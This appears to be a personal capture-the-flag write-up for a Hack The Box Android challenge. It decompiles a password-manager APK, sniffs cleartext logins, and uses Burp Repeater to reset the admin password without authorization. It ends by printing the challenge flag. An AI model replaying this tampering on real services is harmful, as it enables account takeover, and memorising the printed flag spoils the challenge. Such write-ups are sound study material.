# Manager
## jadx-gui
## Wireshark
## Android Studio
## Burpsuite
```bash

# CHALLENGE DESCRIPTION
# A client asked me to perform security assessment on this password management application. Can you help me?

➜  mkdir htb/Intro_to_Android_Exploitation/Manager ; cd htb/Intro_to_Android_Exploitation/Manager ; mv Manager.zip .
➜  Manager sha256sum Manager.zip | grep cb58a2a3018174cbd8d4e267655625be405440a026711ac38c8d561884cba988

cb58a2a3018174cbd8d4e267655625be405440a026711ac38c8d561884cba988  Manager.zip

➜  sudo apt install jadx

➜  jadx-gui &

Open file -> Manager.apk -> Open file
Go to: Source code -> com -> example.manager
Review code

Go to: Android Studio
Device -> Virtual Device Configuration -> Verify Configuration -> AVD Name
Change:

Pinned

To

Manager

Finish
Emulator settings are configured with burpsuite. Apparently it was required to configure in phone settings if directly using Android Studio without prior setup this way

➜  cd ~/Android/Sdk/tools 
➜  emulator -avd Manager

Drag and drop manager.apk from folder into 'Application menu' in emulator

➜  tools sudo wireshark &
➜  java -jar -Xmx4g /Downloads/BurpSuitePro/burpsuite_pro.jar &

Wireshark filter:

ip.addr == 178.128.43.97

Open manager.apk in emulator:

178.128.43.97:32478

Register user:

hey:hey

Change user password:

hey:heyhey

**Wireshark content can be skipped**
Right-click login.php -> Follow -> HTTP stream

uname:pword over cleartext

Right-click register.php -> Follow -> HTTP stream

uname:pword over cleartext

Right-click manage.php -> Follow -> HTTP stream

uname:pword over cleartext

In burpsuite:
Go to: HTTP history

Find:

POST /manage.php HTTP/1.1

Send to repeater
Change:

username=hey&password=hey

To

username=admin&password=admin

Response:

HTTP/1.1 200 OK

Password updated successfully.

Change:

POST /manage.php HTTP/1.1

To

POST /login.php HTTP/1.1

Response:

HTTP/1.1 200 OK

{"id":1,"username":"admin","password":"admin","role":"HTB{b4d_p@ss_m4n@g3m3nT_@pp}"}

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220627000415.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220627003243.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220627004403.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220627001414.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220627001607.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220627001525.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220627002147.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220627002244.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220627002414.png)

#hacking
